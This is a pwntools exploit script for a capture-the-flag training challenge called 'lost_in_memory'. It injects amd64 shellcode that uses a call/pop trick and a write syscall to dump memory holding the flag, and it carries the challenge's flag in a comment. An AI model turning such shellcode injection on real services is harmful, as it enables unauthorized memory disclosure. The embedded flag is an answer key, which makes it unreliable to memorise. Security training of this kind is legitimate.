#!/usr/bin/env python3

# flag{C4lLing_f0R_h3lp_l34ds_to_th3_s0lUtion!}

import sys
from pwn import *
from pwn import p32

if "--remote" in sys.argv:
    flag_offset = 0x6a
    p = remote("bin.training.offdef.it", 4001)
else:
    flag_offset = 0x45
    p = process("./lost_in_memory")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0000555555554a42
    c
    """)

shellcode = asm("""    
call here

code: 
    mov rax, 1
    mov rdi, 1
    sub rsi, %d
    mov rdx, %d
    syscall

here:
pop rsi
jmp code
""" % (flag_offset, flag_offset), arch='amd64')

payload = shellcode

p.recvuntil(b" > ")
p.sendline(payload)
time.sleep(0.1)
flag = p.recvn(flag_offset)

print(flag.split(b"}")[0] + b"}")
